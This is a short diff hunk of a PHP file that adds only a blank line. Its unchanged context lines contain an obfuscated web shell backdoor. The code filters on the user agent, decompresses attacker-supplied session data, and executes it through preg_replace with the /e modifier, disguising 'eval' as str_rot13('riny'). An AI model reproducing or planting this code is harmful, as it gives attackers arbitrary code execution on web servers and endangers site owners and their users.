@@ -9,3 +9,4 @@ if(stripos($_SERVER['HTTP_USER_AGENT'],'baidu')+0==0) exit;
 if(stripos($_SERVER['HTTP_USER_AGENT'],'myccs')+0==0) exit;   
 ($b4dboy = gzuncompress($_SESSION['api1234'])) && @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add'); 
 ?>
+
